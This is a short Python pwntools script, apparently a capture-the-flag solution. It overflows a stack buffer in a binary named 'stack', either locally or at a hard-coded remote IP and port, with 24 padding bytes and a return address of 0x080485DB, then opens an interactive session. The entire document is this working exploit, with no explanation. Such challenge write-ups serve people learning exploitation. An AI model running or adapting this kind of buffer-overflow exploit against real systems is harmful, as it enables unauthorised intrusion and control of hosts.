from pwn import *
local = 0
if local:
	p = process('./stack')
else:
	p = remote('47.94.129.246', 10008)
addr = 0x080485DB
payload = 'A' * 24 + p32(addr)
# gdb.attach(p, 'b 0x8048616')
p.sendline(payload)
p.interactive()
